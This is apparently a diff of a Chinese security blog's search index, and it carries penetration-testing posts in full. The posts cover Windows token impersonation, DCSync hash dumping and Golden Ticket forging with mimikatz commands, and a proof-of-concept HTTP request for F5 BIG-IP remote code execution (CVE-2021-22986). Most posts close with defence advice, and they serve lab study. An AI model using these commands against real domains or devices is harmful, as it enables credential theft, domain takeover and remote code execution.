+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">NT AUTHORITY\IUSR</span><br><span class="line">NT AUTHORITY\LOCAL SERVICE</span><br><span class="line">NT AUTHORITY\NETWORK SERVICE</span><br><span class="line">NT AUTHORITY\SYSTEM</span><br><span class="line">TEST\Administrator</span><br><span class="line">TEST\yhy</span><br></pre></td></tr></table></figure>
+
+<p>得到模拟令牌：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">NT AUTHORITY\ANONYMOUS LOGON</span><br></pre></td></tr></table></figure>
+
+<p>伪造授权令牌，就可以拥有它的权限了，使用下面命令获取对应token的权限</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">impersonate_token &#x27;TEST\Administrator&#x27;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210220085137.png" alt="image-20210128223730735"></p>
+<p>使用<code>drop_token</code>返回之前的token，和 <code>rev2self</code> 一样</p>
+<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210220085141.png" alt="image-20210128223804482"></p>
+<p>Windows 访问令牌是用户登录后分配的用于标识用户权限的对象，通过复制令牌，我们可以摸拟该令牌代表的用户。典型的用法是获取 SYSTEM 权限，以及查看本机是否有域控账号的令牌，然后窃取该令牌，从而控制整个域。</p>
+<h2 id="0x03-令牌窃取提权的防御措施"><a href="#0x03-令牌窃取提权的防御措施" class="headerlink" title="0x03 令牌窃取提权的防御措施"></a>0x03 令牌窃取提权的防御措施</h2><p>针对令牌窃取提权的防御措施如下：</p>
+<ul>
+<li>为了防止域管理员的令牌被窃取，应该禁止域管理员登录其它主机。如果登录了，使用完后应该及时重启电脑，从而把令牌清除。</li>
+<li>及时安装微软推送的补丁</li>
+<li>对于来路不明的或者危险的软件，既不要在系统中使用，也不要在虚拟机中使用</li>
+<li>对令牌的时效性进行限制，以防止散列值被破解后泄露有效的令牌信息</li>
+<li>对于令牌，应采取加密存储及多长验证保护</li>
+<li>使用加密链路SSL&#x2F;TLS传输令牌，以防止被中间人窃听</li>
+</ul>
+]]></content>
+      <categories>
+        <category>域渗透</category>
+      </categories>
+      <tags>
+        <tag>Windows提权</tag>
+        <tag>域渗透</tag>
       </tags>
   </entry>
   <entry>
@@ -1815,65 +1815,6 @@
       </tags>
   </entry>
   <entry>
-    <title>域渗透-DCSync和黄金票据</title>
-    <url>/2021/02/21/%E5%9F%9F%E6%B8%97%E9%80%8F-DCSync%E5%92%8C%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE/</url>
-    <content><![CDATA[<blockquote>
-<p>  新年开工快乐～～～</p>
-</blockquote>
-<h1 id="域渗透-DCSync和黄金票据"><a href="#域渗透-DCSync和黄金票据" class="headerlink" title="域渗透-DCSync和黄金票据"></a>域渗透-DCSync和黄金票据</h1><h2 id="0x01-概述"><a href="#0x01-概述" class="headerlink" title="0x01 概述"></a>0x01 概述</h2><blockquote>
-<p>krbtgt账户：每个域控制器都有一个”krbtgt”的用户账户，是KDC的服务账户，用来创建票据授予服务（TGS）  加密的密钥。</p>
-<p>黄金票据（Golden Ticket）：它能让黑客在拥有普通域用户权限和krbtgt hash的情况下，获取域管理员权限。</p>
-<p>DCSync：mimikatz中的功能，能够模拟域控制器并从域控制器导出帐户密码hash。</p>
-</blockquote>
-<p>在域内，不同DC之间，每15分钟都会有一次域数据的同步。实现不登录到域控制器上，而获取域控制器数据库中的数据。</p>
-<p>在DCSync功能出现之前，要想获得域用户的哈希，需要登录域控制器，在域控制器上执行代码才能获得域用户的哈希。2015年8月，新版的mimikatz增加了DCSync的功能，该功能可以模仿一个域控DC，从真实的域控中请求数据，如用户的哈希。该功能最大的特点就是在于不用登陆域服务器，即可远程通过域数据同步复制的方式获得想要的用户口令信息。</p>
-<p>需要注意的是，DCSync攻击的对象如果是只读域控制器(RODC)，则会失效，因为RODC是不能参与复制同步数据到其他DC的。 </p>
-<p>DCSync的原理非常清晰，利用域控制器之间的数据同步复制：</p>
-<ul>
-<li><p>发现网络中的目标域控制器</p>
-</li>
-<li><p>通过DRS服务的GetNCChanges接口发起数据同步请求，Directory Replication Service（DRS）Remote Protocol</p>
-<blockquote>
-<p>GetNCChanges：当一个DC（成为客户端DC）想从其他DC（成为服务端DC）获取数据时，客户端DC会向服务端DC发起一个GetNCChanges请求。回应的数据包括需要同步的数据。如果需要同步的数据比较多，则会重复上述过程，毕竟每次回应的数据有限。</p>
-</blockquote>
-</li>
-</ul>
-<p>默认情况下，只有和Domain Controllers和Enterprise Domain Admins权限能够使用DCSync，但我们可以对域内普通用户添加ACL(Access Control List)实现普通用户调用DCSync导出域内所有用户的hash。</p>
-<h2 id="0x02-利用DCSync导出域内用户Hash"><a href="#0x02-利用DCSync导出域内用户Hash" class="headerlink" title="0x02 利用DCSync导出域内用户Hash"></a>0x02 利用DCSync导出域内用户Hash</h2><h4 id="利用条件：获得以下任一的权限"><a href="#利用条件：获得以下任一的权限" class="headerlink" title="利用条件：获得以下任一的权限"></a>利用条件：获得以下任一的权限</h4><ul>
-<li>Administrators组内的用户</li>
-<li>Domain Admins组内的用户</li>
-<li>Enterprise Admins组内的用户</li>
-<li>域控制器的计算机帐户</li>
-</ul>
-<h4 id="利用原理"><a href="#利用原理" class="headerlink" title="利用原理"></a>利用原理</h4><p>利用DRS(Directory Replication Service)协议通过IDL_DRSGetNCChanges从域控制器复制用户凭据。</p>
-<p>获取相应权限后(这里实验的是域内机器win7，域控为win8上，登录的域内用户yhy)</p>
-<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210221224807.png" alt="image-20210221165619981"></p>
-<h4 id="使用mimikatz导出指定域用户的信息-包括哈希"><a href="#使用mimikatz导出指定域用户的信息-包括哈希" class="headerlink" title="使用mimikatz导出指定域用户的信息(包括哈希)"></a>使用<code>mimikatz</code>导出指定域用户的信息(包括哈希)</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">lsadump::dcsync /domain:test.yhy /user:administrator /csv</span><br><span class="line">lsadump::dcsync /domain:test.yhy /user:administrator</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210221224813.png" alt="image-20210221171218395"></p>
-<p>获得了域内用户的hash后，进一步利用可参考之前的文章：<a href="http://mp.weixin.qq.com/s?__biz=MzkzODIwMTIwNg==&mid=2247483885&idx=1&sn=edaa58066c4128f53adae0d8f048bff7&chksm=c28298f4f5f511e2e3fc11813896af4f457ba302ee52911562bedac8dd8977fd748e7b9a1982#rd">哈希传递攻击</a></p>
-<h2 id="0x03生成黄金票据，获取域管理权限"><a href="#0x03生成黄金票据，获取域管理权限" class="headerlink" title="0x03生成黄金票据，获取域管理权限"></a>0x03生成黄金票据，获取域管理权限</h2><p>获取<code>krbtgt</code>（域内默认创建的账号）账户Hash</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">lsadump::dcsync /domain:test.yhy /user:krbtgt /csv</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210221224823.png" alt="image-20210221223933475"></p>
-<p>生成黄金票据，并使用</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kerberos::golden /krbtgt:8a4f49ff2d2eedf30b5e565e4332d0b5 /admin:administrator /domain:test.yhy /sid:S-1-5-21-2604854395-1602356619-879117556-502 /ticket:administrator.ticket.bin</span><br><span class="line"></span><br><span class="line">kerberos::ptt administrator.ticket.bin</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210221224829.png" alt="image-20210221223253549"></p>
-<p>提升到域管理权限成功</p>
-<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210221224837.png" alt="image-20210221223505092"></p>
-<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210221224841.png" alt="image-20210221223535054"></p>
-<h2 id="0x04-防御"><a href="#0x04-防御" class="headerlink" title="0x04 防御"></a>0x04 防御</h2><p>DCSync攻击的原理是模拟域控制器发起服务器之间的数据同步复制。最好的防御方法是给控制器设置白名单，在域内，域控制器的数量、IP地址、MAC地址是非常明确清晰的资产，将这些资产设置在允许同步的白名单内。非白名单的IP不允许发生数据同步。</p>
-]]></content>
-      <categories>
-        <category>域渗透</category>
-      </categories>
-      <tags>
-        <tag>Windows提权</tag>
-        <tag>域渗透</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>弈 - Codeql 自动运行和项目监控工具</title>
     <url>/2022/12/27/%E5%BC%88%20-%20Codeql%20%E8%87%AA%E5%8A%A8%E8%BF%90%E8%A1%8C%E5%92%8C%E9%A1%B9%E7%9B%AE%E7%9B%91%E6%8E%A7%E5%B7%A5%E5%85%B7/</url>
     <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>代码审计总是离不开一些神器，笔者常用 <a href="https://github.com/github/codeql-cli-binaries">Codeql</a> 这款工具辅助挖洞。当我每写一个规则都需要对其它项目手动运行检查一遍，效率很低，再加上 <a href="lgtm.com/">lgtm</a> 的关闭，此项目诞生了 — <a href="https://github.com/ZhuriLab/Yi">弈(Yi)</a> </p>
@@ -1939,6 +1880,65 @@
       </categories>
       <tags>
         <tag>GitHub工具</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>域渗透-DCSync和黄金票据</title>
+    <url>/2021/02/21/%E5%9F%9F%E6%B8%97%E9%80%8F-DCSync%E5%92%8C%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE/</url>
+    <content><![CDATA[<blockquote>
+<p>  新年开工快乐～～～</p>
+</blockquote>
+<h1 id="域渗透-DCSync和黄金票据"><a href="#域渗透-DCSync和黄金票据" class="headerlink" title="域渗透-DCSync和黄金票据"></a>域渗透-DCSync和黄金票据</h1><h2 id="0x01-概述"><a href="#0x01-概述" class="headerlink" title="0x01 概述"></a>0x01 概述</h2><blockquote>
+<p>krbtgt账户：每个域控制器都有一个”krbtgt”的用户账户，是KDC的服务账户，用来创建票据授予服务（TGS）  加密的密钥。</p>
+<p>黄金票据（Golden Ticket）：它能让黑客在拥有普通域用户权限和krbtgt hash的情况下，获取域管理员权限。</p>
+<p>DCSync：mimikatz中的功能，能够模拟域控制器并从域控制器导出帐户密码hash。</p>
+</blockquote>
+<p>在域内，不同DC之间，每15分钟都会有一次域数据的同步。实现不登录到域控制器上，而获取域控制器数据库中的数据。</p>
+<p>在DCSync功能出现之前，要想获得域用户的哈希，需要登录域控制器，在域控制器上执行代码才能获得域用户的哈希。2015年8月，新版的mimikatz增加了DCSync的功能，该功能可以模仿一个域控DC，从真实的域控中请求数据，如用户的哈希。该功能最大的特点就是在于不用登陆域服务器，即可远程通过域数据同步复制的方式获得想要的用户口令信息。</p>
+<p>需要注意的是，DCSync攻击的对象如果是只读域控制器(RODC)，则会失效，因为RODC是不能参与复制同步数据到其他DC的。 </p>
+<p>DCSync的原理非常清晰，利用域控制器之间的数据同步复制：</p>
+<ul>
+<li><p>发现网络中的目标域控制器</p>
+</li>
+<li><p>通过DRS服务的GetNCChanges接口发起数据同步请求，Directory Replication Service（DRS）Remote Protocol</p>
+<blockquote>
+<p>GetNCChanges：当一个DC（成为客户端DC）想从其他DC（成为服务端DC）获取数据时，客户端DC会向服务端DC发起一个GetNCChanges请求。回应的数据包括需要同步的数据。如果需要同步的数据比较多，则会重复上述过程，毕竟每次回应的数据有限。</p>
+</blockquote>
+</li>
+</ul>
+<p>默认情况下，只有和Domain Controllers和Enterprise Domain Admins权限能够使用DCSync，但我们可以对域内普通用户添加ACL(Access Control List)实现普通用户调用DCSync导出域内所有用户的hash。</p>
+<h2 id="0x02-利用DCSync导出域内用户Hash"><a href="#0x02-利用DCSync导出域内用户Hash" class="headerlink" title="0x02 利用DCSync导出域内用户Hash"></a>0x02 利用DCSync导出域内用户Hash</h2><h4 id="利用条件：获得以下任一的权限"><a href="#利用条件：获得以下任一的权限" class="headerlink" title="利用条件：获得以下任一的权限"></a>利用条件：获得以下任一的权限</h4><ul>
+<li>Administrators组内的用户</li>
+<li>Domain Admins组内的用户</li>
+<li>Enterprise Admins组内的用户</li>
+<li>域控制器的计算机帐户</li>
+</ul>
+<h4 id="利用原理"><a href="#利用原理" class="headerlink" title="利用原理"></a>利用原理</h4><p>利用DRS(Directory Replication Service)协议通过IDL_DRSGetNCChanges从域控制器复制用户凭据。</p>
+<p>获取相应权限后(这里实验的是域内机器win7，域控为win8上，登录的域内用户yhy)</p>
+<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210221224807.png" alt="image-20210221165619981"></p>
+<h4 id="使用mimikatz导出指定域用户的信息-包括哈希"><a href="#使用mimikatz导出指定域用户的信息-包括哈希" class="headerlink" title="使用mimikatz导出指定域用户的信息(包括哈希)"></a>使用<code>mimikatz</code>导出指定域用户的信息(包括哈希)</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">lsadump::dcsync /domain:test.yhy /user:administrator /csv</span><br><span class="line">lsadump::dcsync /domain:test.yhy /user:administrator</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210221224813.png" alt="image-20210221171218395"></p>
+<p>获得了域内用户的hash后，进一步利用可参考之前的文章：<a href="http://mp.weixin.qq.com/s?__biz=MzkzODIwMTIwNg==&mid=2247483885&idx=1&sn=edaa58066c4128f53adae0d8f048bff7&chksm=c28298f4f5f511e2e3fc11813896af4f457ba302ee52911562bedac8dd8977fd748e7b9a1982#rd">哈希传递攻击</a></p>
+<h2 id="0x03生成黄金票据，获取域管理权限"><a href="#0x03生成黄金票据，获取域管理权限" class="headerlink" title="0x03生成黄金票据，获取域管理权限"></a>0x03生成黄金票据，获取域管理权限</h2><p>获取<code>krbtgt</code>（域内默认创建的账号）账户Hash</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">lsadump::dcsync /domain:test.yhy /user:krbtgt /csv</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210221224823.png" alt="image-20210221223933475"></p>
+<p>生成黄金票据，并使用</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kerberos::golden /krbtgt:8a4f49ff2d2eedf30b5e565e4332d0b5 /admin:administrator /domain:test.yhy /sid:S-1-5-21-2604854395-1602356619-879117556-502 /ticket:administrator.ticket.bin</span><br><span class="line"></span><br><span class="line">kerberos::ptt administrator.ticket.bin</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210221224829.png" alt="image-20210221223253549"></p>
+<p>提升到域管理权限成功</p>
+<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210221224837.png" alt="image-20210221223505092"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210221224841.png" alt="image-20210221223535054"></p>
+<h2 id="0x04-防御"><a href="#0x04-防御" class="headerlink" title="0x04 防御"></a>0x04 防御</h2><p>DCSync攻击的原理是模拟域控制器发起服务器之间的数据同步复制。最好的防御方法是给控制器设置白名单，在域内，域控制器的数量、IP地址、MAC地址是非常明确清晰的资产，将这些资产设置在允许同步的白名单内。非白名单的IP不允许发生数据同步。</p>
+]]></content>
+      <categories>
+        <category>域渗透</category>
+      </categories>
+      <tags>
+        <tag>Windows提权</tag>
+        <tag>域渗透</tag>
       </tags>
   </entry>
   <entry>
@@ -2100,6 +2100,63 @@
       </tags>
   </entry>
   <entry>
+    <title>漏洞复现-F5 BIG-IP远程代码执行漏洞(CVE-2021-22986)</title>
+    <url>/2021/04/04/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-F5%20BIG-IP%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E(CVE-2021-22986)/</url>
+    <content><![CDATA[<blockquote>
+<p>  燕子来时新社，梨花落后清明。</p>
+</blockquote>
+<h2 id="0x01-漏洞描述"><a href="#0x01-漏洞描述" class="headerlink" title="0x01 漏洞描述"></a>0x01 漏洞描述</h2><p>F5 BIG-IP 是美国 F5 公司的一款集成了网络流量管理、应用程序安全管理、负载均衡等功能的应用交付平台。</p>
+<p>CVE-2021-22986 该漏洞允许未经身份验证的攻击者通过BIG-IP管理界面和自身IP地址对iControl REST接口进行网络访问，以执行任意系统命令，创建或删除文件以及禁用服务。</p>
+<h2 id="0x02-漏洞影响"><a href="#0x02-漏洞影响" class="headerlink" title="0x02 漏洞影响"></a>0x02 漏洞影响</h2><table>
+<thead>
+<tr>
+<th align="center">F5 BIG-IP 16.0.0-16.0.1</th>
+<th>F5 BIG-IP 12.1.0-12.1.5.2</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">F5 BIG-IP 15.1.0-15.1.2</td>
+<td>F5 BIG-IQ 7.1.0-7.1.0.2</td>
+</tr>
+<tr>
+<td align="center">F5 BIG-IP 14.1.0-14.1.3.1</td>
+<td>F5 BIG-IQ 7.0.0-7.0.0.1</td>
+</tr>
+<tr>
+<td align="center">F5 BIG-IP 13.1.0-13.1.3.5</td>
+<td>F5 BIG-IQ 6.0.0-6.1.0</td>
+</tr>
+</tbody></table>
+<h2 id="0x03-漏洞复现"><a href="#0x03-漏洞复现" class="headerlink" title="0x03 漏洞复现"></a>0x03 漏洞复现</h2><p><a href="https://login.f5.com/resource/registerEmail.do">https://login.f5.com/resource/registerEmail.do</a> 注册好后，下载</p>
+<p><a href="https://downloads.f5.com/esd/eula.sv?sw=BIG-IP&pro=big-ip_v16.x&ver=16.0.1&container=16.0.1_Virtual-Edition&path=&file=&B1=I+Accept">https://downloads.f5.com/esd/eula.sv?sw=BIG-IP&amp;pro=big-ip_v16.x&amp;ver=16.0.1&amp;container=16.0.1_Virtual-Edition&amp;path=&amp;file=&amp;B1=I+Accept</a>  选择ova格式的，可以快速使用vm虚拟机打开，安装完后，用户名：root，密码：default，成功登陆后，输入config输入config ，几次回车即可看到当前ip，访问</p>
+<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210404144019.png" alt="image-20210404113304697"></p>
+<h4 id="3-1-使用POC攻击"><a href="#3-1-使用POC攻击" class="headerlink" title="3.1 使用POC攻击"></a>3.1 使用POC攻击</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /mgmt/tm/util/bash HTTP/1.1</span><br><span class="line">Content-Type: application/json</span><br><span class="line">User-Agent: Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Connection: close</span><br><span class="line">Authorization: Basic YWRtaW46QVNhc1M=</span><br><span class="line">X-F5-Auth-Token: </span><br><span class="line">Host: 192.168.1.191</span><br><span class="line">Content-Length: 39</span><br><span class="line"></span><br><span class="line">&#123;&quot;command&quot;:&quot;run&quot;,&quot;utilCmdArgs&quot;:&quot;-c id&quot;&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210404144015.png" alt="image-20210404111524871"></p>
+<h2 id="0x04-利用工具编写"><a href="#0x04-利用工具编写" class="headerlink" title="0x04 利用工具编写"></a>0x04 利用工具编写</h2><p>直接使用上次的<a href="http://mp.weixin.qq.com/s?__biz=MzkzODIwMTIwNg==&mid=2247483987&idx=1&sn=2ee31ccbf8588c23e4184fcd3ab251f8&chksm=c2829b4af5f5125c563e437263eec4ebac08f32f2ace3e4bed9f5c8e562bac5299260b847c27#rd">图形化漏洞利用工具</a>编写</p>
+<blockquote>
+<p>图形化漏洞利用工具已更新</p>
+<p>项目地址：<a href="https://github.com/yhy0/ExpDemo-JavaFX">https://github.com/yhy0/ExpDemo-JavaFX</a></p>
+<p>V1.1 </p>
+<p>​	参考冰蝎的代理，添加代理设置，方便走burp调试</p>
+<p>​	优化批量检查逻辑，使用接口，这样每次添加新的漏洞利用时，就不需要修改批量检查的逻辑。</p>
+</blockquote>
+<p>在<code>src/main/java/com/yhy/core</code>下新建<code>CVE_2021_22986</code>类，实现<code>ExploitInterface</code>接口，并实现里面的函数，具体填充，直接将项目中的示例<code>CVE_2020_14882</code> 的内容复制过去，修改一下内容，填充payload即可</p>
+<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210404144011.png" alt="image-20210404113814410"></p>
+<p>写完后，进入<code>src/main/java/com/yhy/core/Constants.java</code> 和 <code>src/main/java/com/yhy/tools/Tools.java</code>修改</p>
+<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210404144002.png" alt="image-20210404132413838"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210404144006.png" alt="image-20210404132702066"></p>
+<p>运行即可。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210404143957.gif" alt="CVE-2021-22986"></p>
+]]></content>
+      <categories>
+        <category>漏洞复现</category>
+      </categories>
+      <tags>
+        <tag>漏洞复现</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>简单dockers逃逸学习</title>
     <url>/2020/08/04/%E7%AE%80%E5%8D%95docker%E9%80%83%E9%80%B8%E5%AD%A6%E4%B9%A0/</url>
     <content><![CDATA[<h2 id="1-目标界面"><a href="#1-目标界面" class="headerlink" title="1. 目标界面"></a>1. 目标界面</h2><p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/blog/%E8%AE%B0%E4%B8%80%E6%AC%A1%E7%AE%80%E5%8D%95%E7%9A%84%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/1.png"></p>
@@ -2194,63 +2251,6 @@
       <tags>
         <tag>内网渗透</tag>
         <tag>docker逃逸</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>漏洞复现-F5 BIG-IP远程代码执行漏洞(CVE-2021-22986)</title>
-    <url>/2021/04/04/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-F5%20BIG-IP%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E(CVE-2021-22986)/</url>
-    <content><![CDATA[<blockquote>
-<p>  燕子来时新社，梨花落后清明。</p>
-</blockquote>
-<h2 id="0x01-漏洞描述"><a href="#0x01-漏洞描述" class="headerlink" title="0x01 漏洞描述"></a>0x01 漏洞描述</h2><p>F5 BIG-IP 是美国 F5 公司的一款集成了网络流量管理、应用程序安全管理、负载均衡等功能的应用交付平台。</p>
-<p>CVE-2021-22986 该漏洞允许未经身份验证的攻击者通过BIG-IP管理界面和自身IP地址对iControl REST接口进行网络访问，以执行任意系统命令，创建或删除文件以及禁用服务。</p>
-<h2 id="0x02-漏洞影响"><a href="#0x02-漏洞影响" class="headerlink" title="0x02 漏洞影响"></a>0x02 漏洞影响</h2><table>
-<thead>
-<tr>
-<th align="center">F5 BIG-IP 16.0.0-16.0.1</th>
-<th>F5 BIG-IP 12.1.0-12.1.5.2</th>
-</tr>
-</thead>
-<tbody><tr>
-<td align="center">F5 BIG-IP 15.1.0-15.1.2</td>
-<td>F5 BIG-IQ 7.1.0-7.1.0.2</td>
-</tr>
-<tr>
-<td align="center">F5 BIG-IP 14.1.0-14.1.3.1</td>
-<td>F5 BIG-IQ 7.0.0-7.0.0.1</td>
-</tr>
-<tr>
-<td align="center">F5 BIG-IP 13.1.0-13.1.3.5</td>
-<td>F5 BIG-IQ 6.0.0-6.1.0</td>
-</tr>
-</tbody></table>
-<h2 id="0x03-漏洞复现"><a href="#0x03-漏洞复现" class="headerlink" title="0x03 漏洞复现"></a>0x03 漏洞复现</h2><p><a href="https://login.f5.com/resource/registerEmail.do">https://login.f5.com/resource/registerEmail.do</a> 注册好后，下载</p>
-<p><a href="https://downloads.f5.com/esd/eula.sv?sw=BIG-IP&pro=big-ip_v16.x&ver=16.0.1&container=16.0.1_Virtual-Edition&path=&file=&B1=I+Accept">https://downloads.f5.com/esd/eula.sv?sw=BIG-IP&amp;pro=big-ip_v16.x&amp;ver=16.0.1&amp;container=16.0.1_Virtual-Edition&amp;path=&amp;file=&amp;B1=I+Accept</a>  选择ova格式的，可以快速使用vm虚拟机打开，安装完后，用户名：root，密码：default，成功登陆后，输入config输入config ，几次回车即可看到当前ip，访问</p>
-<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210404144019.png" alt="image-20210404113304697"></p>
-<h4 id="3-1-使用POC攻击"><a href="#3-1-使用POC攻击" class="headerlink" title="3.1 使用POC攻击"></a>3.1 使用POC攻击</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /mgmt/tm/util/bash HTTP/1.1</span><br><span class="line">Content-Type: application/json</span><br><span class="line">User-Agent: Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Connection: close</span><br><span class="line">Authorization: Basic YWRtaW46QVNhc1M=</span><br><span class="line">X-F5-Auth-Token: </span><br><span class="line">Host: 192.168.1.191</span><br><span class="line">Content-Length: 39</span><br><span class="line"></span><br><span class="line">&#123;&quot;command&quot;:&quot;run&quot;,&quot;utilCmdArgs&quot;:&quot;-c id&quot;&#125;</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210404144015.png" alt="image-20210404111524871"></p>
-<h2 id="0x04-利用工具编写"><a href="#0x04-利用工具编写" class="headerlink" title="0x04 利用工具编写"></a>0x04 利用工具编写</h2><p>直接使用上次的<a href="http://mp.weixin.qq.com/s?__biz=MzkzODIwMTIwNg==&mid=2247483987&idx=1&sn=2ee31ccbf8588c23e4184fcd3ab251f8&chksm=c2829b4af5f5125c563e437263eec4ebac08f32f2ace3e4bed9f5c8e562bac5299260b847c27#rd">图形化漏洞利用工具</a>编写</p>
-<blockquote>
-<p>图形化漏洞利用工具已更新</p>
-<p>项目地址：<a href="https://github.com/yhy0/ExpDemo-JavaFX">https://github.com/yhy0/ExpDemo-JavaFX</a></p>
-<p>V1.1 </p>
-<p>​	参考冰蝎的代理，添加代理设置，方便走burp调试</p>
-<p>​	优化批量检查逻辑，使用接口，这样每次添加新的漏洞利用时，就不需要修改批量检查的逻辑。</p>
-</blockquote>
-<p>在<code>src/main/java/com/yhy/core</code>下新建<code>CVE_2021_22986</code>类，实现<code>ExploitInterface</code>接口，并实现里面的函数，具体填充，直接将项目中的示例<code>CVE_2020_14882</code> 的内容复制过去，修改一下内容，填充payload即可</p>
-<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210404144011.png" alt="image-20210404113814410"></p>
-<p>写完后，进入<code>src/main/java/com/yhy/core/Constants.java</code> 和 <code>src/main/java/com/yhy/tools/Tools.java</code>修改</p>
-<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210404144002.png" alt="image-20210404132413838"></p>
-<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210404144006.png" alt="image-20210404132702066"></p>
-<p>运行即可。</p>
-<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210404143957.gif" alt="CVE-2021-22986"></p>
-]]></content>
-      <categories>
-        <category>漏洞复现</category>
-      </categories>
-      <tags>
-        <tag>漏洞复现</tag>
       </tags>
   </entry>
   <entry>
